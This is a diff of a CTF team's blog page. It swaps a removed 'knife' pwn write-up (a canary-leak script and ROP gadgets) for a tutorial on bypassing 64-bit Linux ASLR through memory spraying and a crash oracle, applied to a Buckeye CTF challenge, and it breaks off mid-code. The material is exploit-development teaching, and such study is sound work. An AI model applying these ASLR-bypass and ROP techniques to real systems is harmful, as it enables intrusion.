@@ -9,7 +9,7 @@
     <meta name="author" content="Alessandro Versari">
 
     <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
-    <title>fibonhack | knife</title>
+    <title>fibonhack | Breaking 64 bit aslr on Linux x86-64 without any infoleak</title>
 
     <link rel="stylesheet" href="/assets/css/style.css">
     <script src="/assets/js/main.js"></script>
@@ -124,7 +124,7 @@
     <nav class="flex flex-wrap mx-auto w-full container md:px-0 px-4 text-white text-lg">
         <span class="text-green-500">fibonhack@templeos</span>
         <p>:</p>
-        <span class="text-blue-400">~/knife</span>
+        <span class="text-blue-400">~/Breaking 64 bit aslr on Linux x86-64 without any infoleak</span>
         <p>$</p>
         <div class="ml-1 ">
             cat page.txt
@@ -148,17 +148,15 @@
   <div class="post">
 
   <header class="post-header" style="padding-bottom: 0.8em;">
-    <p> 24 May 2020 </p>
-    <h1 style="margin: -0.02em auto;"> knife - m0lecon 2020 Teaser - pwn</h1>
+    <p> 2 Nov 2021 </p>
+    <h1 style="margin: -0.02em auto;"> Breaking 64 bit aslr on Linux x86-64 without any infoleak </h1>
     <div id="authors"> by
     
     
       
-      <a href="/members/OrsoBruno96">OrsoBruno96</a>, 
       
-    
+        <a href="/members/nick0ve">Nicola Vella</a>
       
-      <a href="/members/nick0ve">nick0ve</a>
       
     
     
@@ -166,158 +164,1128 @@
   </header>
 
   <article class="post-content">
-  <h2 id="the-challenge">The challenge</h2>
-<p>ELF 64-bits binary that listens on tcp port waiting for connections. It is not clear what the program should do, but for sure it does not handle it correctly.</p>
+  <p>In this article, I’ll discuss about the application of the technique described by <a href="https://twitter.com/5aelo">Samuel Groß</a> in his <a href="https://googleprojectzero.blogspot.com/2020/01/remote-iphone-exploitation-part-2.html">Remote iPhone Exploitation Part 2: Bringing Light into the Darkness – a Remote ASLR Bypass</a>, to bypass ASLR on Linux x86_64.</p>
 
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>  checksec knife
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/orsobruno96/ctfs/m0lecon/knife'</span>
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<p>To show this I’m gonna solve a pwnable challenge from <a href="https://ctf.osucyber.club/">Buckeye CTF</a>, guess_god.</p>
 
+<p>I’ll try to keep the content as beginner friendly as possible, so feel free to skip any section if you feel confident enough and just want to see the exploit.</p>
+
+<h1 id="0-introduction">0. Introduction</h1>
+<p align="center"><img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/intro-chall-description.png" /></p>
+<p><br /></p>
+
+<p>I didn’t play the CTF, but I got interested in the challenge about 2hrs before the ctf end thanks to <a href="https://github.com/Guray00">Guray00</a>, who was asking for help in <a href="https://twitter.com/fibonhack">fibonhack</a> discord about some crypto shenanigans.</p>
+
+<p>I couldn’t help him, but I took a look at pwnable challenges, and figured it would be good to understand the P0 blogpost and hopefully get that bounty.</p>
+
+<h1 id="1-aslr-and-how-to-bypass-it">1. ASLR and how to bypass it</h1>
+
+<h2 id="11-what-is-aslr">1.1 What is ASLR?</h2>
+<p><strong>Address Space Layout Randomization</strong> (ASLR) is a computer security technique which involves <strong>randomly positioning</strong> the base address of an executable and the position of libraries, heap, and stack, in a process’s address space.</p>
+
+<h2 id="12-aslr-on-linux">1.2 ASLR on Linux</h2>
+
+<p>On linux, you can inspect the mappings of a process given its pid through <a href="https://www.kernel.org/doc/Documentation/filesystems/proc.txt">procfs</a>, by reading the file <code class="language-plaintext highlighter-rouge">/proc/&lt;pid&gt;/maps</code>.</p>
+
+<p>If you are a process and you want to know your own memory mappings, you can read <code class="language-plaintext highlighter-rouge">/proc/self/maps</code>.</p>
+
+<p>For example, you can try to read <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> with <code class="language-plaintext highlighter-rouge">cat</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
+55faeb01c000-55faeb01e000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
+55faeb01e000-55faeb023000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
+55faeb023000-55faeb026000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
+55faeb026000-55faeb027000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
+55faeb027000-55faeb028000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
+55faeb115000-55faeb136000 rw-p 00000000 00:00 0                          [heap]
+7fe15dfb1000-7fe15dfd5000 rw-p 00000000 00:00 0
+7fe15dfd5000-7fe15dffb000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7fe15dffb000-7fe15e166000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7fe15e166000-7fe15e1b2000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7fe15e1b2000-7fe15e1b5000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7fe15e1b5000-7fe15e1b8000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7fe15e1b8000-7fe15e1c3000 rw-p 00000000 00:00 0
+7fe15e1c7000-7fe15e1c8000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7fe15e1c8000-7fe15e1ef000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7fe15e1ef000-7fe15e1f9000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7fe15e1f9000-7fe15e1fb000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7fe15e1fb000-7fe15e1fd000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7fff4388f000-7fff438b0000 rw-p 00000000 00:00 0                          [stack]
+7fff43989000-7fff4398d000 r--p 00000000 00:00 0                          [vvar]
+7fff4398d000-7fff4398f000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+root@088ec31b2ce9:/home/ctf/challenge# cat /proc/self/maps
+55ffc0b1b000-55ffc0b1d000 r--p 00000000 fe:01 2497233                    /usr/bin/cat
+55ffc0b1d000-55ffc0b22000 r-xp 00002000 fe:01 2497233                    /usr/bin/cat
+55ffc0b22000-55ffc0b25000 r--p 00007000 fe:01 2497233                    /usr/bin/cat
+55ffc0b25000-55ffc0b26000 r--p 00009000 fe:01 2497233                    /usr/bin/cat
+55ffc0b26000-55ffc0b27000 rw-p 0000a000 fe:01 2497233                    /usr/bin/cat
+55ffc2108000-55ffc2129000 rw-p 00000000 00:00 0                          [heap]
+7f1ec6e0f000-7f1ec6e33000 rw-p 00000000 00:00 0
+7f1ec6e33000-7f1ec6e59000 r--p 00000000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7f1ec6e59000-7f1ec6fc4000 r-xp 00026000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7f1ec6fc4000-7f1ec7010000 r--p 00191000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7f1ec7010000-7f1ec7013000 r--p 001dc000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7f1ec7013000-7f1ec7016000 rw-p 001df000 fe:01 2761561                    /usr/lib/x86_64-linux-gnu/libc-2.33.so
+7f1ec7016000-7f1ec7021000 rw-p 00000000 00:00 0
+7f1ec7025000-7f1ec7026000 r--p 00000000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7f1ec7026000-7f1ec704d000 r-xp 00001000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7f1ec704d000-7f1ec7057000 r--p 00028000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7f1ec7057000-7f1ec7059000 r--p 00031000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7f1ec7059000-7f1ec705b000 rw-p 00033000 fe:01 2761539                    /usr/lib/x86_64-linux-gnu/ld-2.33.so
+7ffc72fa4000-7ffc72fc5000 rw-p 00000000 00:00 0                          [stack]
+7ffc72fe7000-7ffc72feb000 r--p 00000000 00:00 0                          [vvar]
+7ffc72feb000-7ffc72fed000 r-xp 00000000 00:00 0                          [vdso]
+ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
 </code></pre></div></div>
 
-<h2 id="bugs">Bugs</h2>
+<h3 id="memory-mappings-patterns">Memory mappings patterns</h3>
+
+<p>If you do this a couple of times, you could deduce that:</p>
 <ul>
-  <li>bound check for the command <code class="language-plaintext highlighter-rouge">LOAD &lt;idx&gt;</code>. This command lets you read variables on the stack indexed by <code class="language-plaintext highlighter-rouge">idx</code>. The check on <code class="language-plaintext highlighter-rouge">idx</code> is not done correctly, you can actually read negative indexes, canary included.</li>
-  <li>buffer overflow in the main command. You have control over <code class="language-plaintext highlighter-rouge">rbp+0x8</code>.</li>
+  <li>The binary PIE base should be in the range 0x00005500_00000000-0x00005700_00000000, which means 2TB of possible addresses.</li>
+  <li>The heap is near the binary.</li>
+  <li>Libraries fall in the range 0x00007f00_00000000 - 0x00007fff_ffffffff, 1TB of possible addresses.</li>
+  <li>Stack goes (most of the time) in the range 0x00007ffc_00000000 - 0x00007fff_ffffffff, 16gb of possible addresses.</li>
+  <li>The range 0xffffffffff600000 - 0xffffffffff601000 is always mapped, you can read <a href="http://terenceli.github.io/%E6%8A%80%E6%9C%AF/2019/02/13/vsyscall-and-vdso">this article</a> if you are curious about what it is.</li>
 </ul>
 
-<h2 id="exploitation">Exploitation</h2>
+<h2 id="13-how-to-bypass-aslr-without-an-infoleak">1.3 How to bypass ASLR without an infoleak</h2>
 
-<h3 id="surfing-bird">Surfing bird</h3>
-<p>We all hate birds that hide on the stack. We first exploit an out of bound to leak the canary, that doesn’t change after <code class="language-plaintext highlighter-rouge">fork()</code>.</p>
+<p>Let’s discuss what you can do to bypass ASLR when no information leak is possble.</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">ELF</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">gdb</span><span class="p">,</span> <span class="n">remote</span><span class="p">,</span> <span class="n">process</span><span class="p">,</span> <span class="n">log</span><span class="p">,</span> \
-    <span class="n">fit</span><span class="p">,</span> <span class="n">p64</span><span class="p">,</span> <span class="n">u64</span><span class="p">,</span> <span class="n">flat</span><span class="p">,</span> <span class="n">ui</span>
+<p>This is my attempt to summarize what I got from reading Saelo’s blogpost.</p>
 
+<p>To bypass ASLR you need:</p>
+<ul>
+  <li>
+    <p>A memory spraying technique, which lets you map contiguous memory of a given size, on a given range of addresses.</p>
 
-<span class="k">def</span> <span class="nf">recv_bytes_cusu</span><span class="p">(</span><span class="n">off</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="p">(</span><span class="o">-</span><span class="mi">19</span> <span class="o">&lt;</span> <span class="n">off</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">):</span>
-        <span class="k">raise</span> <span class="nb">ValueError</span><span class="p">(</span><span class="s">"Cusu out of bound"</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">"LOAD </span><span class="si">{</span><span class="n">off</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">res</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
+    <p>As he says there are two ways of doing it:</p>
+    <ol>
+      <li>By abusing a memory leak (not an information leak!), a bug in which a chunk of memory is “forgotten” and never freed, and triggering it multiple times until the desired amount of memory has been leaked.</li>
+      <li>By finding and abusing an “amplification gadget”: a piece of code that takes an existing chunk of data and copies it, potentially multiple times, thus allowing the attacker to spray a large amount of memory by only sending a relatively small number of bytes.</li>
+    </ol>
+  </li>
+  <li>
+    <p>An <code class="language-plaintext highlighter-rouge">isAddressMapped</code> oracle, which given an address tells you wheter or not that address is mapped.</p>
+  </li>
+</ul>
 
+<h3 id="poc-of-aslr-bypass-on-linux">PoC of ASLR bypass on Linux</h3>
 
-<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
-    <span class="c1"># ui.pause()
-</span>    <span class="n">canary</span> <span class="o">=</span> <span class="n">recv_bytes_cusu</span><span class="p">(</span><span class="o">-</span><span class="mi">13</span><span class="p">)</span>
-    <span class="n">io</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<p>Let’s try to reproduce saelo’s PoC to completely break aslr on Linux.</p>
 
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/ios-break-aslr.png" /> <i> saelo's poc</i> </p>
+<p><br /></p>
+
+<p>On Linux it’s not so easy, it is possible to completely break ASLR only if you are able to allocate 16TB of memory.</p>
+
+<pre><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main()
+{
+    // 64gb
+    size_t size = 0x1000000000;
+
+    // 16TB allocations
+    for (int i = 0; i &lt; 256; i++) {
+        void *mem = malloc(size); // this ends up calling mmap
+        if (!mem) {
+            puts("Failed");
+            return 1;
+        }
+        printf("%p\n", mem);
+    }
+
+    unsigned int *mem = (void*)0x7f0000000000ULL;
+    *mem = 0x41414141;
+    printf("R/W to %p: %x\n", mem, *mem);
+
+    return 0;
+}
+</code></pre>
+
+<h3 id="note-about-glibc-memory-allocation">Note about glibc memory allocation</h3>
+
+<p>From <a href="https://man7.org/linux/man-pages/man3/realloc.3.html">man malloc</a> notes:</p>
+<ul>
+  <li>Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). MMAP_THRESHOLD is 128 kB by default, but is adjustable using mallopt(3). Allocations performed using mmap(2) are unaffected by the RLIMIT_DATA resource limit (see getrlimit(2)).</li>
+</ul>
+
+<p>So <code class="language-plaintext highlighter-rouge">void *mem = malloc(size)</code> will end up calling <code class="language-plaintext highlighter-rouge">mmap(size + malloc_metadata_size, ...)</code></p>
+
+<p>Since libraries are mapped into the process through mmap by <code class="language-plaintext highlighter-rouge">ld</code>, those allocations will end up near the libraries.</p>
+
+<h3 id="boundary-cross-trick">Boundary cross trick</h3>
+<p>If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>mem</th>
+      <th>16tb boundary cross?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0x7fb03b55e010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7fa03b55d010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f903b55c010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f803b55b010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f703b55a010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f603b559010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f503b558010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f403b557010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f303b556010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f203b555010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f103b554010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7f003b553010</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td>0x7ef03b552010</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7ee03b551010</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7ed03b550010</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td>0x7ec03b54f010</td>
+      <td>Yes</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The poc is exploiting the fact that, at some point, the most significant byte of the address returned changes from 7F to 7E and since the allocations are contiguous there must be something inside that range. (Yeah we are applying the <a href="https://en.wikipedia.org/wiki/Intermediate_value_theorem">Bolzano-Weirstress theorem</a> to solve this problem!)</p>
+
+<h1 id="2-the-challenge">2 The challenge</h1>
+
+<p>Thankfully to the author, the zip contains binaries, source code and dockerfile to reproduce the same environment as the remote one.</p>
+
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/intro-dist-files.png" width="50%" /></p>
+<p><br /></p>
+
+<h2 id="21-initial-foothold">2.1 Initial foothold</h2>
+
+<p>It’s always a good thing to grasp some knowledge about the environment, let’s scroll through the files and take some notes.</p>
+
+<ul>
+  <li>jail.cfg set some restrictions, let’s not forget about those limits since they might screw up the exploit:
+    <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">time_limit</span><span class="pi">:</span> <span class="m">300</span>
+<span class="na">cgroup_cpu_ms_per_sec</span><span class="pi">:</span> <span class="m">100</span>
+<span class="na">cgroup_pids_max</span><span class="pi">:</span> <span class="m">64</span>
+<span class="na">rlimit_fsize</span><span class="pi">:</span> <span class="m">2048</span>
+<span class="na">rlimit_nofile</span><span class="pi">:</span> <span class="m">2048</span>
+<span class="na">cgroup_mem_max</span><span class="pi">:</span> <span class="m">1073741824</span> <span class="c1"># 1GB</span>
+</code></pre></div>    </div>
+  </li>
+  <li>From the Dockerfile we can learn some interesting things:
+    <ol>
+      <li>Build and install oatpp 1.2.5, maybe there are useful bugs in this specific version?
+        <pre><code class="language-Docker"># Install oatpp
+RUN git clone https://github.com/oatpp/oatpp.git
+RUN cd /oatpp &amp;&amp; git checkout 1.2.5 &amp;&amp; mkdir build &amp;&amp; cd build &amp;&amp; cmake .. &amp;&amp; make install
+</code></pre>
+      </li>
+      <li>It builds the challenge from scratch
+        <div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">WORKDIR</span><span class="s"> /home/ctf/challenge/src/</span>
+<span class="k">RUN </span><span class="nb">mkdir</span> <span class="nt">-p</span> src/build <span class="o">&amp;&amp;</span> <span class="nb">cd </span>src/build <span class="o">&amp;&amp;</span> cmake .. <span class="o">&amp;&amp;</span> make
+<span class="k">RUN </span><span class="nb">cp </span>src/build/flag_server-exe src/build/libkylezip.so flag.txt /   home/  ctf/challenge/
+</code></pre></div>        </div>
+        <p>This might be a problem, so let’s copy the distribuited binaries  instead.</p>
+        <div class="language-docker highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">COPY</span><span class="s"> bins/flag_server-exe /home/ctf/challenge/</span>
+<span class="k">COPY</span><span class="s"> bins/libkylezip.so /home/ctf/challenge/</span>
+</code></pre></div>        </div>
+      </li>
+    </ol>
+  </li>
+  <li>And the last thing, check the protections of the binaries provided
+    <p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/checksec.png" /><br /> <i></i></p>
+    <p>Sweet, libkylezip.so is compiled with Partial RELRO, that means that the GOT is writable, keep that in mind for when we want to get code execution.</p>
+  </li>
+</ul>
+
+<h2 id="22-setup-the-local-environment-and-poke-the-application">2.2 Setup the local environment and poke the application</h2>
+
+<p>docker-compose.yml file is provided so it is not hard at all to get a working local environment to poke. For those of you that are not confident with docker here is the list of commands you need to know to poke the challenge locally.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker-compose build <span class="c"># Build the image, do this whenever you change something</span>
+docker-compose up <span class="c"># start the container</span>
+docker-compose down <span class="c"># stop the container</span>
+
+docker ps <span class="c"># list containers</span>
+docker <span class="nb">exec</span> <span class="nt">-it</span> &lt;CONTAINER ID&gt; &lt;COMMAND&gt; <span class="c"># exec COMMAND into the container</span>
 </code></pre></div></div>
 
-<h3 id="leaking-libc-address">Leaking libc address</h3>
-<p>Then we reconnect to leak the libc address, using a buffer overflow and a rop
-chain. We use the fact that the file descriptor for the connection is always 4.
-This is because <code class="language-plaintext highlighter-rouge">fork()</code> duplicates entirely the process, including the
-file descriptor table.</p>
+<p>After doing <code class="language-plaintext highlighter-rouge">docker-compose build</code> you can execute <code class="language-plaintext highlighter-rouge">docker-compose up</code> to start the container, and connect to the challenge with <code class="language-plaintext highlighter-rouge">nc 127.0.0.1 9000</code></p>
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/docker-up-nc.png" /><br /> <i></i></p>
 
-<p>To effectively leak the libc we can read the GOT with a rop chain and use
-<code class="language-plaintext highlighter-rouge">sendlen(4, exe.sym.got['write'], size)</code> to read the answer. We cannot simply use
-<code class="language-plaintext highlighter-rouge">puts</code> or <code class="language-plaintext highlighter-rouge">printf</code> because standard output is not bound to our connection.</p>
+<h1 id="3-source-code-analysis">3. Source code analysis</h1>
 
-<p>The gadgets used for this rop chain can be found in the executable,
-You can leak libc addresses more than once to <a href="https://libc.blukat.me/">find</a> <code class="language-plaintext highlighter-rouge">libc6_2.27-3ubuntu1_amd64.deb</code>.</p>
+<p>Now that we have some basic knowledge about what we should do in order to bypass ASLR, let’s look at the source code, keeping in mind that we want to:</p>
+<ul>
+  <li>a way to spray memory in known ranges of memory</li>
+  <li>an isAddrMapped oracle</li>
+</ul>
 
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">pop</span> <span class="nb">rdi</span> <span class="c1">; POP_RDI 0x4014f3</span>
-    <span class="nf">ret</span>
-    <span class="c1">; ...</span>
-    <span class="nf">pop</span> <span class="nb">rsi</span> <span class="c1">; POP_RSI_POP_R15 0x4014f1</span>
-    <span class="nf">pop</span> <span class="nv">r15</span>
-    <span class="nf">ret</span>
-    <span class="c1">; ...</span>
-    <span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x20</span><span class="c1">; MOV_RDX_20 0x401528</span>
-    <span class="nf">ret</span>
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/source-code-folder.png" width="50%" /><br /> <i> Source code folder </i></p>
 
+<p>It’s mostly glue code to get an oatpp web server up and running, in fact the important files which we are gonna analyze are:</p>
+<ul>
+  <li>src/controller/MyController.*</li>
+  <li>kylezip/decompress.*</li>
+</ul>
+
+<h2 id="31-mycontroller">3.1 MyController.*</h2>
+
+<p align="center"> <img src="../../assets/files/breaking-64-bit-aslr-on-linux/images/MyControllerHpp.png" /><br /> <i>MyController.hpp</i></p>
+
+<p>There are 3 endpoints:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">/</code></li>
+  <li><code class="language-plaintext highlighter-rouge">GET /files/{fileId}</code> -&gt; Download a previously uploaded file, if extract is true extract before downloading it.</li>
+  <li><code class="language-plaintext highlighter-rouge">POST /upload/{fileId}</code> -&gt; Upload a file given a {fileId}.</li>
+</ul>
+
+<p>And one function implemented in <code class="language-plaintext highlighter-rouge">MyController.cpp</code></p>
+<pre><code class="language-C">std::shared_ptr&lt;oatpp::base::StrBuffer&gt; MyController::get_file(int file_id, bool extract) 
+</code></pre>
+<p>which:</p>
+<ul>
+  <li>Set <code class="language-plaintext highlighter-rouge">to_open</code> to <code class="language-plaintext highlighter-rouge">{file_id}</code> or <code class="language-plaintext highlighter-rouge">{file_id}.unkyle</code>
+    <pre><code class="language-C">std::ostringstream comp_fname;
+comp_fname &lt;&lt; filename;
+if (extract) {
+  // Want the un-kylezip-d version
+  comp_fname &lt;&lt; ".unkyle";
+}
+auto to_open = comp_fname.str();
+</code></pre>
+  </li>
+  <li>If it’s the first time we are requesting to extract <code class="language-plaintext highlighter-rouge">{file_id}</code> then it calls decompress on it,
+which will write the decompressed file of <code class="language-plaintext highlighter-rouge">{file_id}</code> to <code class="language-plaintext highlighter-rouge">{file_id}.unkyle</code>.
+    <pre><code class="language-C">int fd = open(to_open.c_str(), O_RDONLY);
+if (fd == -1) {
+    if (!extract) return NULL;
+
+    /* Need to create decompressed version of file
+     * Kyle gave me a buggy library so we are going to fork
+     * in case we crash the web server will still stay up.
+     */
+    pid_t p = fork();
+    if (p == 0) {
+      decompress(filename);
+      exit(0);
+    } else {
+      waitpid(p, NULL, 0);
+    }
+
+
+    fd = open(to_open.c_str(), O_RDONLY);
+    if (fd == -1) {
+      return NULL;
+    }
+}
+</code></pre>
+  </li>
+  <li>In the end <code class="language-plaintext highlighter-rouge">mmap</code> the result in memory.
+    <pre><code class="language-C">struct stat sb;
+  
+if (fstat(fd, &amp;sb) != 0) {
+    return NULL;
+}
+  
+/* mmap the file in for performance, or something... idk kyle made me write this */
+// 
+void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+</code></pre>
+  </li>
+</ul>
+
+<h3 id="observations">Observations</h3>
+
+<ul>
+  <li>
+    <p><a href="https://man7.org/linux/man-pages/man2/fork.2.html">fork()</a> creates a new process by duplicating the calling process, at the time of fork() both memory spaces have the same content.</p>
+
+    <p>So if we are able to turn decompress() to an oracle which:</p>
+    <ul>
+      <li>Crashes on bad addresses</li>
+      <li>Doesn’t crash on nice addresses</li>
+    </ul>
+
+    <p>We could use that primitive to infer the memory space of the parent.</p>
+  </li>
+  <li>
+    <p>There is a call to <code class="language-plaintext highlighter-rouge">mmap</code> in the parent process:</p>
+    <pre><code class="language-C">void *mem = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+  
+</code></pre>
+    <p>if we can control <code class="language-plaintext highlighter-rouge">sb.st_size</code>, which is the size of the decompressed file, we could easily turn it into a memory spraying primitive.</p>
+  </li>
+</ul>
+
+<h2 id="32-decompress">3.2 decompress.*</h2>
+
+<h3 id="decompress">decompress()</h3>
+
+<pre><code class="language-C">int decompress(const char *fname)
+</code></pre>
+
+<ul>
+  <li>Maps the input file to the address <code class="language-plaintext highlighter-rouge">0x42069000000</code>.</li>
+  <li>Maps the output file to the address <code class="language-plaintext highlighter-rouge">0x13371337000</code>.</li>
+  <li>Calls do_decompress() which gets the decompression done.</li>
+</ul>
+
+<p>The file is expected to be in the format:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>offset</th>
+      <th>name</th>
+      <th>type</th>
+      <th>description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>+0h</td>
+      <td>magic</td>
+      <td>uint64</td>
+      <td>a magic value, it is expected to be 0x0123456789abcdef</td>
+    </tr>
+    <tr>
+      <td>+8h</td>
+      <td>filesize</td>
+      <td>uint64</td>
+      <td>size of the decompressed file</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="do_decompress">do_decompress()</h3>
+
+<pre><code class="language-C">static void do_decompress(char *out, char *in, size_t insize)
+</code></pre>
+<p>You can view this function as a simple <em>virtual machine</em>, which executes the bytecode pointed by <code class="language-plaintext highlighter-rouge">in</code> and writes the output to the buffer pointed by <code class="language-plaintext highlighter-rouge">out</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">in</code> points to our <code class="language-plaintext highlighter-rouge">{file_id}</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">out</code> points to <code class="language-plaintext highlighter-rouge">{file_id.unkyle}</code>.</p>
+
+<p>This VM has 4 opcodes:</p>
+<ul>
+  <li>0 -&gt; NOP</li>
+  <li>
+    <p>1 -&gt; STORE(u8 b)</p>
+
+    <p>writes <code class="language-plaintext highlighter-rouge">b</code> to <code class="language-plaintext highlighter-rouge">out</code>, increments out by <code class="language-plaintext highlighter-rouge">1</code>.</p>
+
+    <p>Opcode implementation:</p>
+    <pre><code class="language-C">case 1: {
+    // Write byte
+    uint8_t b = in[cur++];
+    *(out++) = b;
+    break;
+}
+</code></pre>
+  </li>
+  <li>
+    <p>2 -&gt; SEEK(u64 off)</p>
+
+    <p>set <code class="language-plaintext highlighter-rouge">out</code> to <code class="language-plaintext highlighter-rouge">out + off</code>.</p>
+
+    <p><code class="language-plaintext highlighter-rouge">out</code> and <code class="language-plaintext highlighter-rouge">off</code> are 64 bit values, so <code class="language-plaintext highlighter-rouge">out = out+off</code> is equivalent to <code class="language-plaintext highlighter-rouge">out = (out+off) % MAX_64BIT_VALUE</code>, this is called <a href="https://en.wikipedia.org/wiki/Integer_overflow">integer overflow</a> and we can exploit this behaviour to reach any 64 bit value. Example:</p>
+    <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">M64</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">)</span> <span class="c1"># Maximum 64bit value
+</span><span class="k">def</span> <span class="nf">get_off</span><span class="p">(</span><span class="n">out</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
